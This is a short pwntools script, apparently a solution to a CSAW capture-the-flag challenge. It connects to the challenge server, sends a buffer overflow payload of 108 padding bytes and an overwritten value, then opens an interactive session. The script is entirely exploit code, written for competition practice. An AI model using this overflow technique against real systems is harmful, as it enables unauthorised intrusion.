from pwn import *

r = remote('pwn.chal.csaw.io', 10106)
r.recvrepeat(3)
r.sendline('A'*108+'\x15\x00\x00\x00')
r.interactive()
